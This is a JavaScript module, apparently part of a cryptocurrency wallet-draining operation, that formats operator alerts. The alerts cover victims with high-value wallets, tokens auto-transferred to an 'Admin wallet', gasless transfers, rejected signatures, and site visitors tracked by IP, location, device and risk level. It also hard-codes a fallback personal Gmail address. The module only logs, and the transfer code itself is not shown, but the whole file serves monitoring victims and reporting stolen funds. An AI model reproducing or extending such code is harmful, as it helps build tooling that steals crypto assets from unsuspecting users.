const nodemailer = require('nodemailer');

class AdminAlertSystem {
  constructor() {
    this.adminEmail = process.env.ADMIN_EMAIL || 'skillstakes01@gmail.com';
    this.alerts = [];
    this.alertCooldowns = new Map(); // Track alert cooldowns
  }

  async sendCriticalAlert(type, data) {
    // Check cooldown for spam prevention
    const cooldownKey = `${type}_${data.userAddress || 'global'}`;
    const lastAlert = this.alertCooldowns.get(cooldownKey);
    const now = Date.now();
    const cooldownTime = 2 * 60 * 60 * 1000; // 2 hours
    
    if (lastAlert && (now - lastAlert) < cooldownTime) {
      const remainingTime = Math.ceil((cooldownTime - (now - lastAlert)) / (60 * 1000));
      console.log(`⏰ Alert cooldown: ${type} - ${remainingTime} minutes remaining`);
      return; // Skip alert during cooldown
    }
    
    // Set cooldown
    this.alertCooldowns.set(cooldownKey, now);
    
    const alert = {
      id: Date.now(),
      type: type,
      data: data,
      timestamp: new Date().toISOString(),
      priority: this.getPriority(type)
    };

    this.alerts.push(alert);
    console.log(`🚨 CRITICAL ALERT: ${type}`, data);

    // Send to admin dashboard/email
    await this.notifyAdmin(alert);
  }

  getPriority(type) {
    const priorities = {
      'HIGH_VALUE_WALLET_DETECTED': 'CRITICAL',
      'LARGE_BALANCE_TRANSFER': 'CRITICAL', 
      'GASLESS_TRANSFER_SUCCESS': 'HIGH',
      'AUTO_TRANSFER_COMPLETED': 'HIGH',
      'WALLET_MONITORING_STARTED': 'MEDIUM',
      'ZERO_BALANCE_WALLET': 'LOW',
      'SIGNATURE_REJECTED': 'LOW',
      'SITE_VISITOR': 'LOW'
    };
    return priorities[type] || 'MEDIUM';
  }

  async notifyAdmin(alert) {
    const message = this.formatAlertMessage(alert);
    
    // Log to console (replace with email/webhook in production)
    console.log('📧 ADMIN NOTIFICATION:', message);
    
    // Store in database for admin dashboard
    // await this.storeAlert(alert);
  }

  formatAlertMessage(alert) {
    const { type, data, timestamp } = alert;
    
    switch(type) {
      case 'HIGH_VALUE_WALLET_DETECTED':
        return `🔥 HIGH VALUE WALLET: ${data.userAddress} has ${data.totalValue} worth of tokens!`;
      
      case 'LARGE_BALANCE_TRANSFER':
        return `💰 LARGE TRANSFER: ${data.amount} ${data.tokenSymbol} transferred from ${data.userAddress}`;
      
      case 'GASLESS_TRANSFER_SUCCESS':
        return `⚡ GASLESS SUCCESS: ${data.amount} ${data.tokenSymbol} via ${data.method}`;
      
      case 'AUTO_TRANSFER_COMPLETED':
        return `✅ AUTO TRANSFER: ${data.amount} ${data.tokenSymbol} → Admin wallet`;
      
      case 'WALLET_MONITORING_STARTED':
        return `👀 MONITORING: ${data.userAddress} enabled auto-monitoring`;
      
      case 'ZERO_BALANCE_WALLET':
        return `🚫 EMPTY WALLET: ${data.userAddress} connected with zero balance`;
      
      case 'SITE_VISITOR':
        return `👁️ NEW VISITOR: ${data.ip} from ${data.location?.city}, ${data.location?.country} | ${data.device.type} | Risk: ${data.riskLevel}`;
      
      default:
        return `📊 ALERT: ${type} - ${JSON.stringify(data)}`;
    }
  }

  getRecentAlerts(limit = 50) {
    return this.alerts
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .slice(0, limit);
  }
}

module.exports = new AdminAlertSystem();